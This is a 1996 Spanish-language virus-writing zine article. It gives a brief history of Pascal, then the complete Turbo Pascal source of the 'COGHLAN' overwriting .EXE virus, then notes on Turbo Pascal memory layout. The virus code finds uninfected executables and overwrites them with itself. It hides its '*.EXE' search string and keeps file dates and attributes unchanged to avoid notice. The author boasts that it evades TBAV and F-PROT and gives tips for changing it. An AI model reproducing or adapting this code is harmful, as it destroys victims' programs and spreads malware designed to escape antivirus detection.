Historia de don Pascal 
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--

  El lenguaje de programacion Pascal es un "lenguaje de alto nivel" y proposi-
to general desarrollado por el profesor suizo NIKLAUS WIRTH como un lenguaje
para ense¤ar la programaci¢n de modo (con metodos) disciplinado sistematico. 
  Para realizar este lenguaje Wirth trato de eliminar las inconsistencias de 
otros lenguajes de programacion existentes en su epoca, y que siriviera para
ense¤ar las tecnicas de programacion a sus alumnos.
  Una version preliminar del lenguaje aparecio en 1968 y el primer compilador
totalmente completo aparecio a finales de 1970 (en 1971 diriamos). Desde enton-
ces muchos compiladores han sido construidos y estan disponibles para diferen-
tes maquinas. Durante muchos a¤os el libro "Pascal User Manual and Report", pu-
blicado por Wirth y Kathleen Jensen en 1974, ha servido "de facto" como estan-
dar de todas las versiones.
  Bueno, despues de esta brevisima rese¤a historica del PASCAL pasamos al plato
principal de esta nota.

Creando un peque¤o virus en PASCAL
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--
(*==============================/ CUT HERE /=================================*)
(*  /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\  *)
(* ³                  Virus "COGHLAN" Creado el 1/1/96                    ³ *)
(* ³         COPYRIGHT (c) 1996 by COEAC Group Viral Development          ³ *)
(* ³                 Created and Designed by DESTROYER                    ³ *)
(* ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ *)
(* ³>>>>>>>>>>>>>> Creatures  Of  Electronic  Anti  Christ <<<<<<<<<<<<<<<³ *)
(* ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ *)
(*  \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/  *)
(*
  Comentarios:
  ÄÄÄÄÄÄÄÄÄÄÄÄ 

  A FAVOR:
  ========

  ş Virus OverWrite.
  ş Infector de .EXE.
  ş Infecta READ ONLY. pero con los hidden y system tiene problemas.
  ş No altera los atributos de los archivos.
  ş No altera la fecha original de los archivos.
  ş Con sencilles se le cambia el ratio de infecci¢n.
  ş No lo detecta el TBAV 7.00 ni el F-PROT 2.22
  ş Se le puede implementar con gran facilidad un metodo de tranversalidad

  CONTRA:
  =======
  
  ş Cualquier modificaci¢n que se le haga en los procedimientos, tanto al
    agregar uno o modificar cualquiera!, se tiene que revisar la posici¢n
    de la marca de infecci¢n.
*)

Uses DOS;                      

Const
    Ratio=3;                    (* Infeccion 1:3 *)
 
Var
     Marca: String[7];          (* Variable para la MARCA de infeccion      *)
  Contador: Integer;            (* Contador de infecciones                  *)
    Time  : LongInt;            (* Para guardar el TIME del file a infectar *)
    Attr  : Word;               (* Para guardar el ATRIBUTO del file.       *)
    Ruta  : String;             (* Aqui guardo la ruta actual               *)

Procedure Init;
Begin
  Marca:='CoGhLaN';             (* Marca de infeccion *)
  Contador:=0;
  GetDir(0,Ruta);
  Ruta:=Ruta+'\';               (* Coloco la ruta actual en la variable     *)
End;

Procedure Bye;                  
Begin
  Writeln('Error in EXE');
  Halt(0);                     (* Termino el programa con un mensaje *)
end;

Function TestCopy(Files:String):Boolean;
Var
     Victim : File;
    NumRead : Integer;
	 Buf: array[1..7] of Char;
Begin
    Assign(Victim,Files);

    GetFAttr(Victim,Attr);     (* Guardo los atributos             *)
    SetFAttr(Victim,Archive);  (* Seteo el atributo a tipo ARCHIVO *)

    Reset(Victim,1);           (* Abro el archivo  *)
    Seek(Victim,$131);         (* Ubico el puntero *)
    BlockRead(Victim, Buf, 
	SizeOf(Buf), NumRead); (* Leo un bloque de 7 bytes*)
    Close(Victim);             (* Cierrro el archivo *)

    SetFAttr(Victim,Attr);     (* Devuelvo los Atributos anteriores *)

    if Buf='CoGhLaN' then      (* Me fijo si esta infectado o no! *)
     TestCopy:=True
    Else
     TestCopy:=False;
End;

Function FindExe(Path:String):String;
Var
  DirInfo : SearchRec;
Begin
   Randomize;                    (* Codigo muerto totalmente jeje!! *)
   FindFirst(Path+'*.'+chr(69)+chr(88)+chr(69),Archive,DirInfo);
                     (*^^^^^^^^^^^^^^^^^^^^^^^ esto es para que no aparezca
                       el famoso *.EXE sino que aparece entre cortado o letras
                       por medio*)          
   While (DosError = 0) do
    Begin
      if Not TestCopy(Path+DirInfo.Name) then
	 Begin
	   FindExe:=Path+DirInfo.Name; 
				 (* Encontre un file para infectar *)
	   Exit;
	 End;
      FindNext(DirInfo);         (* Sigo buscando un file              *)
    End;
   FindExe:='none';              (* Bue' estan todos infectados!, mala *)
End;                             (* suerte!, lo dejamos pa' otro dia   *)

Procedure InfectFile(Nombre:String);
Var
     Virus,
   Carrier : File;
   NumRead,
NumWritten : Word;
     Buf   : array[1..1024] of Char;
     Cont  : Byte;               (* Se calcula 4 lecturas/escrituras para *)
				 (* el codigo del gusano y un poco m s    *)
Begin
    {$I-}                        (* Activo Controlador de errores *)
     Assign(Virus,ParamStr(0));
     Assign(Carrier,Nombre);

     GetFAttr(Carrier,Attr);     (* Guardo los atributos *)
     SetFAttr(Carrier,Archive);  (* Seteo el atributo a tipo ARCHIVO *)

     Reset(Virus,1);             (* Abro el archivo que posee el virus *)
     Reset(Carrier,1);           (* Abro el archivo a infectar *)

     GetFTime(Carrier,Time);     (* Guardo la hora del file *)
     Seek(Carrier,0);            (* Lo comienzo a copiar desde el principio *)
     Cont:=1;                    (* Empiezo con el primer bloque *)

     repeat
       BlockRead(Virus, Buf, SizeOf(Buf), NumRead);
				 (* Leo un bloque de 1024 y lo coloco *)
				 (* en el buffer                      *)
       BlockWrite(Carrier, Buf, NumRead, NumWritten);Inc(Cont);
				 (* Copio del buffer hacia el archivo *)
       if Cont > 6               (* En total son 6 bloques de 1024 bytes *)
	    then NumRead:=0;     (* Salgo del repeat *)
     until (NumRead = 0) or (NumWritten <> NumRead);

     SetFTime(Carrier,Time);     (* Devuelvo la hora anterior *)
     Close(Virus);
     Close(Carrier);             (* Ya me traslade. Ja,Ja,Ja,Ja,Ja *)
     SetFAttr(Carrier,Attr);     (* Devuelvo los Atributos anteriores *)

    {$I+}                        (* Desactivo Controlador de errores *)
     if IORESULT<>0 then Bye;    (* Si hay error me las piro *)
     Inc(Contador);              (* Controlo el ratio de infeccion *)
End;

Begin
  Init;                          (* Inicializacion del programa *)
  Repeat                         (* @1 *)
    if FindExe(Ruta) = 'none' then Bye;  
				 (* Esta todo infectado asi que CHAU *)
    InfectFile(FindExe(Ruta));   (* Procedo a infectar el file encontrado *)
  Until Contador=Ratio;          (* repito a @1 hasta que haya   *)
				 (* cumplido el ratio            *)
  Bye;                           (* Mensajito de que me las piro *)
End.
(*==============================/ CUT HERE /=================================*)
		     
Disposicion de la memoria en un programa hecho en PASCAL
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--

    Turbo Pascal divide la memoria de su computadora en cuatro partes: el 
segmento de codigo, el segmento de datos, el segmento pila (STACK) y el segmen-
to MONTICULO o ALMACENAMIENTO DINAMICO (HEAP). Tecnicamente la pila y el monti-
culo no estan totalmente separados, pero funcionan como entidades separadas.
    El segmento de datos esta claramente dedicado al almacenamiento de datos, 
pero en los otros tres segmentos tambien pueden almacenarse datos. La figura 1
muestra el mapa de memoria simplificada de turbo pascal 5.x, 6.0 y 7.0. Cada mo-
dulo (que inlcuye el programa principal y cada unidad) tiene su propio segmento
de codigo. El programa principal ocupa el primer segmento de unidades (en orden
inverso de como estan listadas en la clausula USES) y el ultimo segmento de co-
digo esta ocupado por la libreria en tiempo de ejecucion.
    El tama¤o de un segmento de codigo no puede exceder de 64k, pero el tama¤o
total del codigo esta limitado solo por la memoria disponible. El segmento de
datos contiene todas las constantes de tipo seguidas por las variables globa
les.El tama¤o del segmento de la pila no puede exceder de 64k (el tama¤o por 
defecto es 16k).
    El BUFFER o memoria intermedia de recubrimiento (OVERLAY) se utiliza por la
unidad estandar OVERLAY para almacenar codigo recubierto. Si el programa no 
tiene RECUBRIMIENTO, el tama¤o de la memoria intermedia del recubrimiento es 
cero.
    La figura 2 (modificacion de la 1) muestra como queda la memoria cuando
un programa arranca, y en ella se observa que todas las variables locales se
almacenan en la pila (STACK) y variables globales (tambien llamadas estaticas)
se almacenan en el segmento de datos. El codigo y el segmento de datos estan lo-
calizados en la parte baja de la memoria y la pila (STACK) y el almacenamiento
dinamico o monticulo (HEAP) ocupan la zona alta de la memoria.
    El diagrama de la figura 2 muestra tambien que la pila crece hacia abajo en
la memoria y el monticulo crece hacia arriba en la memoria. Aunque la pila y el 
monticulo comparten la misma zona de la memoria, ellas nunca deben solaparse.
    La mayoria de las variables que se declaran en Turbo Pascal son estaticas, 
su tama¤o se fija en tiempo de compilacion y no pueden variar. Por el contrario,
el monticulo almacena variables dinamicas.

ÚÄÄÄÄÄÄÄÄÄÄ¿
³ FIGURA 1 ³
ÀÄÄÄÄÄÄÄÄÄÄÙ

	     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
	     ³     Lista Libre (crece hacia abajo)       ³
	     ³                                          ³
   FreePtr ÄÃ------------------------------------------Ä´
	     ³             Memoria libre                 ³
   HeapPtr ÄÃ------------------------------------------Ä´
	     ³     Monticulo (crece hacia arriba)        ³
	     ³                                          ³
   HeapOrg ÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ OvHeapEnd
	     ³        Recubrimiento de Buffer            ³
	     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ OvHeapOrg
	     ³        Pila (crece hacia abajo)           ³
	     ³                                          ³
 Sseg:Sptr ÄÃ------------------------------------------Ä´
	     ³               Pila Libre                  ³
 Sseg:0000 ÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
	     ³           Variables Globales              ³
	     Ã------------------------------------------Ä´ÄÄÄÄÄÄÄÄÄÄ¿
	     ³          Constantes con tipos             ³           ³
 Dseg:0000 ÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´           ³
	     Ã------------------------------------------Ä´           ³
	     ³  Segmento de codigo de la primera unidad  ³           ³
	     Ã------------------------------------------Ä´   Contenido de una
	     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ       imagen de
								Archivo .EXE
	     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿           ³
	     ³  Segmento de codigo de la unidad SYSTEM   ³           ³
	     Ã------------------------------------------Ä´           ³
	     ³  Segmento de codigo de la ultima unidad   ³           ³
	     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´           ³
	     ³ Segmento de codigo del programa principal ³           ³
	     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ÄÄÄÄÄÄÄÄÄÄÙ
	     ³       Program Segment Prefix (PSP)        ³
 PrefixSeg ÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ÚÄÄÄÄÄÄÄÄÄÄ¿
³ FIGURA 2 ³
ÀÄÄÄÄÄÄÄÄÄÄÙ

		      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  El tama¤o de la zona
 Aqui se almacena el  ³  Comienzo del   ³  de codigo es el total
 codigo objeto.       ³  Programa       ³  del tama¤o del codigo
		      ³  Principal      ³  de programa principal
		      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  mas el tama¤o del co-
		      ³ Codigo Unidad n ³  digo de todas las uni-
		      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  dades utilizadas por 
		      ³ ...             ³  el programa. El tama¤o
		      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  total del codigo solo 
		      ³ Codigo Unidad 2 ³  esta limitado por la 
		      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  memoria disponible.        
		      ³ Codigo Unidad 1 ³
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  Tama¤o de la zona de
 Se almacenan         ³ Comienzo de     ³  datos (suma de todas
 variables globales   ³ datos           ³  las variables globales
 (estaticas) y        ³                 ³  del programa principal
 constantes con tipo  ³                 ³  y todas las unidades
		      ³ Fin de datos    ³ utilizadas). El maximo
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´³ es 65.520 bytes.
 Se almacenan         ³                 ³³
 variables de         ³                 ³³
 subprogramas,        ³                 ³³ El tama¤o de la zona
 parametros pasados y ³                 ³³ de la pila se establece
 otros valores        ³                 ³³ con las directivas de 
 auxiliares           ³ Comienzo de la  ³³ compilacion.
		      ³ pila            ³³ 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´  La pila crece hacia la
 Se almacenan         ³ Comienzo del    ³³ zona mas baja de la
 variables dinamicas  ³ monticulo       ³³ memoria
 creadas por NEW y    ³                 ³³
 GETMEM.              ³                 ³³ El monticulo crece hacia
		      ³ Cima del        ³³ la zona mas alta de la
		      ³ monticulo       ³³ memoria
		      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´³
		      ³                 ³³
		      ³                 ³  El tama¤o del monticulo
		      ³                 ³  se establece con las
		      ³                 ³  opciones del compilador.
 Espacio del monticulo³                 ³  Si la memoria disponible
 no utilizado         ³                 ³  es menor que el limite
 disponible para      ³                 ³  bajo del monticulo, el 
 alamacenar variables ³                 ³  programa no se cargara.
 dinamicas adicionales³                 ³
		      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Adicionales y comentarios
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--

 Bueno gente espero que les haya servido/gustado o almenos perdido time en leer
este articulo!, en resumen!, la programacion en pascal no es para nada dificil!
lo bueno que tuvo esto es que cuando prove el virus en si!, ningun antivirus lo
pudo detectar ni con sus flagsitos, je!, la unica rese¤a que tengo que hacer en
referencia al virus! es que cuando hagan algun cambio o agreguen algo al virus,
presten atencion donde se encuentra la MARCA DE INFECCION!, dentro del file una
vez compilado!, ya que la ubicacion varia dependiendo del contenido del progra-
ma, no quiere decir que va a cambiar bruscamente!, pero tiene peque¤as diferen-
cias de unos +/- 10 o 15 bytes. La ubicacion que yo les deje en el fuente es la
actual compilandolo como esta!, aparte la misma esta dada en hexadecimal!, para
que si lo ven con el HIEW no tengan que andar convirtiendo de hexa a decimal!.
 Bue' despues de este breve comentario!, solamente les deseo suerte!, y nos
vemos en la MG#6 (espero sinceramente!).

							     Bye Viruckers!
		     
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
		 -/ Creatures Of Electronic Anti Christ /-
	    Written by DESTROYER for MOVING GRAVE MAGAZINE N§ 5
			in HALLS OF THE DAMNED BBS
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
